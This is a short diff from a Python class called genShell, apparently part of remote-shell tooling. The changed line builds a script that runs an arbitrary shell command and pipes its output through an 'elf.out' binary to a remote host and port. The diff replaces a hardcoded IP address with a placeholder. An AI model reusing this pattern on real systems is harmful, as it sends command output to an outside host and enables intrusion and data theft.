@@ -114,7 +114,7 @@ class genShell:
 
 	def runCMD(self, shellcmd, shellcmd_index, assetName):
 		self.process_timeout = int(time.time())
-		runcmd_ = "\r\n{} 2>&1 | {}/elf.out 167.99.251.85 {} -w 10;\r\n".format(shellcmd, self.dataPath, self.lport)
+		runcmd_ = "\r\n{} 2>&1 | {}/elf.out {API_FQDN_IP} {} -w 10;\r\n".format(shellcmd, self.dataPath, self.lport)
 		with open("assets/runsh_{}.sh".format(assetName), "w") as f:
 			f.write(runcmd_)
 		thread_filename = "threads/%dx%d"%(self.threaduid, self.tasks[shellcmd_index][2])
